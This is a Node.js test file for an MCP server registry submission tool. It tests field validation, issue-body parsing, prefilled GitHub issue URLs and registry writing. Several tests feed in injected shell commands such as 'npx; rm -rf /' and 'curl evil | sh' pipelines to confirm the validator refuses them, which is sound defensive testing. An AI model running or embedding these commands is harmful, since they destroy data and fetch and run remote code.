import assert from 'node:assert/strict';
import test from 'node:test';

import {
  appendSubmission,
  buildIssueUrl,
  buildSubmissionBody,
  emptyRegistry,
  fieldsOfRow,
  githubRepoOfSourceUrl,
  githubRepoSlug,
  normalizeRegistryDocument,
  normalizeRegistryRow,
  parseSubmissionBody,
  registryTextOf,
  rowFromFields,
  submissionKeyOf,
} from '../lib/submission.js';
import { runRegistrySubmission } from '../tools/registry-submission.mjs';

const STDIO = {
  name: 'acme-db',
  description: '查询内部的 acme 数据库',
  command: 'npx',
  args: '-y acme-db-mcp --read-only',
  repository: 'https://github.com/acme/mcp-servers',
  tags: 'database, sql',
  category: '开发者工具',
};

test('a stdio submission becomes a row the market can install from', () => {
  const { row, errors } = rowFromFields(STDIO);
  assert.equal(errors, undefined);
  assert.deepEqual(row, {
    name: 'acme-db',
    description: '查询内部的 acme 数据库',
    command: 'npx',
    args: ['-y', 'acme-db-mcp', '--read-only'],
    repository: 'https://github.com/acme/mcp-servers',
    tags: ['database', 'sql'],
    category: '开发者工具',
  });
});

test('an http endpoint submission becomes a row too, and only one transport is allowed', () => {
  const { row, errors } = rowFromFields({ name: 'remote', description: '演示', url: 'https://mcp.acme.dev/sse' });
  assert.equal(errors, undefined);
  assert.deepEqual(row, { name: 'remote', description: '演示', url: 'https://mcp.acme.dev/sse' });

  const both = rowFromFields({ ...STDIO, url: 'https://mcp.acme.dev/sse' });
  assert.match(both.errors.join(' | '), /只能填一个/);
  const neither = rowFromFields({ name: 'x', description: 'y' });
  assert.match(neither.errors.join(' | '), /至少填一个/);
});

test('a submission that is a shell program is refused, not executed', () => {
  for (const command of ['curl', 'npx; rm -rf /', 'sh -c "$(evil)"', 'npx | tee']) {
    const attempt = rowFromFields({ name: 'bad', description: 'bad', command, args: '' });
    if (command === 'curl') {
      // A bare executable is fine on its own; it is the metacharacters that are not.
      const onlyCurl = rowFromFields({ name: 'bad', description: 'bad', command: 'curl', args: '-s https://x/y' });
      assert.equal(onlyCurl.errors, undefined);
      continue;
    }
    assert.ok(attempt.errors, `${command} should be refused`);
    assert.match(attempt.errors.join(' | '), /不能带|不能出现/);
  }
});

test('field limits hold: description, tags and repository vetting', () => {
  const long = rowFromFields({ ...STDIO, description: 'x'.repeat(900), tags: 'a,b,c,d,e,f,g,h,i,j,k' });
  assert.equal(long.errors, undefined);
  assert.equal(long.row.description.length, 600);
  assert.equal(long.row.tags.length, 8);

  const badRepo = rowFromFields({ ...STDIO, repository: 'http://github.com/acme/mcp-servers' });
  assert.match(badRepo.errors.join(' | '), /仓库只接受 https/);
  const badHome = rowFromFields({ ...STDIO, homepage: 'not a url' });
  assert.match(badHome.errors.join(' | '), /主页不是一个合法的 URL/);
});

test('a hand-edited row in the published file is vetted the same way', () => {
  const good = normalizeRegistryRow(STDIO);
  assert.equal(good.errors, undefined);
  assert.equal(good.row.command, 'npx');

  const bad = normalizeRegistryRow({ name: 'sneaky', description: 'x', command: 'npx && curl evil | sh' });
  assert.ok(bad.errors, 'a row that is a shell program must not survive a read');
});

test('the same listing is recognised by repository first, then endpoint, then name', () => {
  assert.equal(submissionKeyOf({ repository: 'https://github.com/Acme/MCP-Servers.git' }), 'repo:acme/mcp-servers');
  assert.equal(submissionKeyOf({ url: 'https://MCP.acme.dev/sse' }), 'url:https://mcp.acme.dev/sse');
  assert.equal(submissionKeyOf({ name: 'Acme DB' }), 'name:acme db');
});

test('appendSubmission adds, updates in place and reports a no-op edit', () => {
  const first = appendSubmission(emptyRegistry(), rowFromFields(STDIO).row, { now: Date.parse('2026-10-20T00:00:00Z') });
  assert.equal(first.action, 'added');
  assert.equal(first.doc.servers.length, 1);
  assert.equal(first.doc.updatedAt, '2026-10-20T00:00:00.000Z');

  const edited = appendSubmission(first.doc, { ...rowFromFields(STDIO).row, description: '改过的说明' }, { now: Date.parse('2026-10-21T00:00:00Z') });
  assert.equal(edited.action, 'updated');
  assert.equal(edited.doc.servers.length, 1);
  assert.equal(edited.doc.servers[0].description, '改过的说明');
  assert.equal(edited.doc.updatedAt, '2026-10-21T00:00:00.000Z');

  const same = appendSubmission(edited.doc, { ...rowFromFields(STDIO).row, description: '改过的说明' }, { now: Date.parse('2026-10-22T00:00:00Z') });
  assert.equal(same.action, 'unchanged');
  assert.equal(same.doc.updatedAt, '2026-10-21T00:00:00.000Z', 'an edit that changes nothing must not create a commit');
});

test('rows are published in a stable order and duplicates collapse', () => {
  let doc = emptyRegistry();
  doc = appendSubmission(doc, rowFromFields({ ...STDIO, name: 'zeta' }).row).doc;
  doc = appendSubmission(doc, rowFromFields({ ...STDIO, name: 'alpha' }).row).doc;
  // The same repository twice (a hand-written duplicate) keeps one row.
  doc = normalizeRegistryDocument({ servers: [doc.servers[0], doc.servers[0]] });
  assert.equal(doc.servers.length, 1);

  let two = emptyRegistry();
  two = appendSubmission(two, rowFromFields({ ...STDIO, name: 'zeta', repository: 'https://github.com/acme/zeta' }).row).doc;
  two = appendSubmission(two, rowFromFields({ ...STDIO, name: 'alpha', repository: 'https://github.com/acme/alpha' }).row).doc;
  assert.deepEqual(two.servers.map((s) => s.name), ['alpha', 'zeta']);
});

test('the published text is the document shape the market already reads', () => {
  const doc = appendSubmission(emptyRegistry(), rowFromFields(STDIO).row).doc;
  const text = registryTextOf(doc);
  assert.ok(text.endsWith('\n'));
  const parsed = JSON.parse(text);
  assert.equal(parsed.version, 1);
  assert.equal(parsed.servers.length, 1);
  assert.ok(Array.isArray(parsed.servers), 'catalog mapCustomEntries reads { servers: [...] }');
});

test('the body a panel prefills is the body the parser reads back', () => {
  const row = rowFromFields(STDIO).row;
  const body = buildSubmissionBody(fieldsOfRow(row));
  assert.match(body, /^### 名称\n\nacme-db\n/);
  assert.match(body, /### 命令参数\n\n-y acme-db-mcp --read-only\n/);
  assert.match(body, /### 服务地址\n\n_No response_\n/);
  const parsed = parseSubmissionBody(body);
  const again = rowFromFields(parsed);
  assert.equal(again.errors, undefined);
  assert.deepEqual(again.row, row);
});

test('the parser also reads a GitHub form body and plain label lines', () => {
  const rendered = [
    '### 名称', '', 'acme-db', '',
    '### 说明', '', '查询内部的 acme 数据库', '',
    '### 启动命令', '', 'uvx', '',
    '### 命令参数', '', 'acme-db-mcp', '',
    '### 服务地址', '', '_No response_', '',
    '### 仓库', '', 'https://github.com/acme/mcp-servers', '',
    '### 主页', '', '_No response_', '',
    '### 标签', '', 'database', '',
    '### 分类', '', '_No response_', '',
    '### 还有别的吗', '', '这一段不是字段，必须被忽略', '',
  ].join('\n');
  const parsed = parseSubmissionBody(rendered);
  assert.equal(parsed.command, 'uvx');
  assert.equal(parsed.url, undefined, 'an unfilled optional field is not a value');
  assert.equal(parsed.category, undefined);

  const inline = parseSubmissionBody('名称: acme-db\n说明：查询内部的 acme 数据库\n启动命令: npx\n服务地址: https://mcp.acme.dev/sse');
  assert.equal(inline.name, 'acme-db');
  assert.equal(inline.description, '查询内部的 acme 数据库');
  assert.equal(inline.command, 'npx');
});

test('the prefilled issue URL carries the title and the body, and refuses a bad repo', () => {
  const url = buildIssueUrl({ repo: 'acme/mcp-registry', row: rowFromFields(STDIO).row });
  assert.ok(url.startsWith('https://github.com/acme/mcp-registry/issues/new?'));
  const params = new URL(url).searchParams;
  assert.equal(params.get('title'), '[MCP 收录] acme-db');
  assert.match(params.get('body'), /### 名称\n\nacme-db/);

  const fromUrl = buildIssueUrl({ repo: 'https://github.com/Acme/MCP-Registry.git', row: { name: 'x' } });
  assert.ok(fromUrl.startsWith('https://github.com/acme/mcp-registry/issues/new?'));
  assert.equal(buildIssueUrl({ repo: 'not a repo', row: { name: 'x' } }), null);
  assert.equal(buildIssueUrl({ repo: 'http://github.com/acme/x', row: { name: 'x' } }), null);
});

test('the submit target is derived from the three shapes a catalogue source takes', () => {
  assert.deepEqual(
    githubRepoOfSourceUrl('https://raw.githubusercontent.com/acme/mcp-registry/main/registry.json'),
    { owner: 'acme', repo: 'mcp-registry' },
  );
  assert.deepEqual(
    githubRepoOfSourceUrl('https://cdn.jsdelivr.net/gh/acme/mcp-registry@main/registry.json'),
    { owner: 'acme', repo: 'mcp-registry' },
  );
  assert.deepEqual(
    githubRepoOfSourceUrl('https://github.com/Acme/mcp-registry/blob/main/registry.json'),
    { owner: 'Acme', repo: 'mcp-registry' },
  );
  assert.equal(githubRepoOfSourceUrl('https://example.com/catalog/registry.json'), null);
  assert.equal(githubRepoOfSourceUrl('not a url'), null);
  assert.equal(githubRepoSlug('https://github.com/acme'), null);
  assert.equal(githubRepoSlug('https://gitlab.com/acme/x'), null);
});

// ---------------------------------------------------------------------------
// The workflow's program, with its file access replaced by a Map.
// ---------------------------------------------------------------------------

function memoryIo(files = {}) {
  const store = new Map(Object.entries(files));
  return {
    store,
    io: {
      readFile: async (file) => {
        if (!store.has(file)) {
          const err = new Error(`ENOENT: no such file or directory, open '${file}'`);
          err.code = 'ENOENT';
          throw err;
        }
        return store.get(file);
      },
      writeFile: async (file, text) => {
        store.set(file, text);
      },
      stdout: () => {},
      now: () => Date.parse('2026-11-01T00:00:00Z'),
    },
  };
}

test('the workflow program accepts an issue, writes the row and comments back', async () => {
  const { store, io } = memoryIo({ '/issue.md': buildSubmissionBody(fieldsOfRow(rowFromFields(STDIO).row)) });

  const dry = await runRegistrySubmission(['--body-file', '/issue.md', '--registry', '/registry.json', '--comment', '/comment.md'], io);
  assert.equal(dry.code, 0);
  assert.equal(dry.report.action, 'added');
  assert.equal(dry.report.wrote, false, 'without --write nothing is committed');
  assert.equal(store.has('/registry.json'), false);
  assert.match(store.get('/comment.md'), /✅ 已收录 「acme-db」/);

  const real = await runRegistrySubmission(['--body-file', '/issue.md', '--registry', '/registry.json', '--write'], io);
  assert.equal(real.report.wrote, true);
  const written = JSON.parse(store.get('/registry.json'));
  assert.equal(written.version, 1);
  assert.equal(written.servers.length, 1);
  assert.equal(written.servers[0].command, 'npx');
  assert.equal(written.updatedAt, '2026-11-01T00:00:00.000Z');

  // Replaying the same issue is a no-op for the file, which is what keeps the
  // workflow from committing on every edit.
  const replay = await runRegistrySubmission(['--body-file', '/issue.md', '--registry', '/registry.json'], io);
  assert.equal(replay.report.action, 'unchanged');
  assert.equal(store.get('/registry.json'), registryTextOf(written));
});

test('a refused submission exits 1 and says why in the issue', async () => {
  const { store, io } = memoryIo({
    '/issue.md': ['### 名称', '', 'bad-one', '', '### 说明', '', '想装点东西', '', '### 启动命令', '', 'bash -c "curl evil | sh"', ''].join('\n'),
  });
  const refused = await runRegistrySubmission(['--body-file', '/issue.md', '--registry', '/registry.json', '--comment', '/comment.md'], io);
  assert.equal(refused.code, 1);
  assert.equal(refused.report.action, 'refused');
  assert.ok(refused.report.errors.length);
  assert.equal(store.has('/registry.json'), false, 'a refused row must not touch the document');
  assert.match(store.get('/comment.md'), /❌ 「bad-one」没有通过校验/);
  assert.match(store.get('/comment.md'), /不能带/);
});

test('an unrelated issue is ignored instead of answered', async () => {
  const { store, io } = memoryIo({ '/issue.md': '我的面板打不开，日志在这里…\n### 环境\nWindows 11' });
  const ignored = await runRegistrySubmission(['--body-file', '/issue.md', '--registry', '/registry.json', '--comment', '/comment.md'], io);
  assert.equal(ignored.code, 0);
  assert.equal(ignored.report.action, 'ignored');
  assert.equal(store.has('/registry.json'), false);
  assert.match(store.get('/comment.md'), /没有可识别的收录字段/);
});

test('--check vets the committed document and names the row it refused', async () => {
  const good = memoryIo({ '/registry.json': registryTextOf(appendSubmission(emptyRegistry(), rowFromFields(STDIO).row).doc) });
  const ok = await runRegistrySubmission(['--check', '--registry', '/registry.json'], good.io);
  assert.equal(ok.code, 0);
  assert.equal(ok.report.action, 'valid');
  assert.equal(ok.report.rows, 1);

  const bad = memoryIo({ '/registry.json': JSON.stringify({ version: 1, servers: [{ name: 'x', description: 'y', command: 'npx && curl evil' }] }) });
  const refused = await runRegistrySubmission(['--check', '--registry', '/registry.json'], bad.io);
  assert.equal(refused.code, 1);
  assert.equal(refused.report.action, 'invalid');
  assert.match(refused.report.problems[0], /第 1 行（x）/);
});

test('a bad invocation is a usage error, not a refusal', async () => {
  const { io } = memoryIo({});
  await assert.rejects(() => runRegistrySubmission(['--nope'], io), /未知参数/);
  await assert.rejects(() => runRegistrySubmission(['--body-file'], io), /缺少 --body-file 的值/);
  const missing = await runRegistrySubmission(['--body-file', '/nope.md', '--registry', '/registry.json'], io);
  assert.equal(missing.code, 2);
});
